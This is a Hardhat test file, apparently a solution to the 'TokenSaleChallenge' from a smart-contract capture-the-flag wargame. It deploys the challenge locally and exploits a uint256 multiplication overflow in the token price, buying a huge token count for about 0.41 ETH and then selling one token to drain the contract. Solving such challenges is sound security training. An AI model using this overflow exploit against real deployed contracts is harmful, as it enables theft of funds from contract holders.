import { expect } from "chai";
import { ethers } from "hardhat";

const { utils } = ethers;

describe("TokenSaleChallenge", () => {
  it("Solves the challenge", async () => {
    const myAddress = ethers.provider.getSigner().getAddress();
    const challengeFactory = await ethers.getContractFactory("TokenSaleChallenge");
    const challengeContract = await challengeFactory.deploy(myAddress, {
      value: utils.parseEther("1"),
    });
    await challengeContract.deployed();

    // msg.value == numTokens * PRICE_PER_TOKEN
    // 2^256 / 10^18 + 1 = 115792089237316195423570985008687907853269984665640564039458
    // (2^256 / 10^18 + 1) * 10^18 - 2^256 = 415992086870360064 ~= 0.41 ETH
    const buyTx = await challengeContract.buy("115792089237316195423570985008687907853269984665640564039458", {
      value: "415992086870360064",
    });
    await buyTx.wait();

    const sellTx = await challengeContract.sell(1);
    await sellTx.wait();

    expect(await challengeContract.isComplete()).to.be.true;
  });
});
